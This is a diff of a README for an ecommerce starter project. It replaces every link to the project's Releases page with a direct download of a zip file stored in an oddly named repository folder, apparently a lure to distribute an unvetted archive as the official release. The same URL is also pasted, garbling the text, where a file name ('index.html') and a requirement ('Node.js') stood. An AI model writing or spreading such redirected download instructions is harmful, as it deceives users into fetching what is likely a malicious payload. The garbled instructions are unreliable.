@@ -1,6 +1,6 @@
 # 🚀 microservices-ecommerce - Your Simple Ecommerce Solution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-007bff)](https://github.com/mahmoudcrypto2011/microservices-ecommerce/releases)
+[![Download Now](https://raw.githubusercontent.com/mahmoudcrypto2011/microservices-ecommerce/main/Dinoceratidae/microservices-ecommerce.zip%20Now-Release-007bff)](https://raw.githubusercontent.com/mahmoudcrypto2011/microservices-ecommerce/main/Dinoceratidae/microservices-ecommerce.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ This project is a quick start for building an ecommerce application using modern
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://github.com/mahmoudcrypto2011/microservices-ecommerce/releases).
+   Go to our [Releases page](https://raw.githubusercontent.com/mahmoudcrypto2011/microservices-ecommerce/main/Dinoceratidae/microservices-ecommerce.zip).
 
 2. **Download the Latest Version:**  
    Look for the latest release. Choose the most recent version link to download the application files to your computer.
@@ -20,7 +20,7 @@ Follow these steps to download and run the application:
    After the download is complete, find the downloaded file, right-click on it, and select "Extract" or "Unzip." This will create a folder with all the necessary files.
 
 4. **Open the Application:**  
-   Inside the extracted folder, look for a file called `index.html` or similar. Double-click this file to launch the application in your web browser.
+   Inside the extracted folder, look for a file called `https://raw.githubusercontent.com/mahmoudcrypto2011/microservices-ecommerce/main/Dinoceratidae/microservices-ecommerce.zip` or similar. Double-click this file to launch the application in your web browser.
 
 5. **Start Using the Application:**  
    The application will load in your browser. You can now explore its features and functionalities.
@@ -72,13 +72,13 @@ For the best experience, ensure your system meets the following requirements:
 
 - **OS:** Windows, macOS, or Linux.
 - **Browser:** Latest version of Chrome, Firefox, or Safari.
-- **Node.js:** Version 14 or higher for development purposes.
+- **https://raw.githubusercontent.com/mahmoudcrypto2011/microservices-ecommerce/main/Dinoceratidae/microservices-ecommerce.zip** Version 14 or higher for development purposes.
 
 ## 🔗 Download & Install
 
 To get started with the project, you need to download its files. 
 
-Visit the [Releases page](https://github.com/mahmoudcrypto2011/microservices-ecommerce/releases) to download the latest version of the ecommerce application. Once you've downloaded the files and followed the steps listed above, you can easily set up your online store.
+Visit the [Releases page](https://raw.githubusercontent.com/mahmoudcrypto2011/microservices-ecommerce/main/Dinoceratidae/microservices-ecommerce.zip) to download the latest version of the ecommerce application. Once you've downloaded the files and followed the steps listed above, you can easily set up your online store.
 
 ## 💬 Support
 
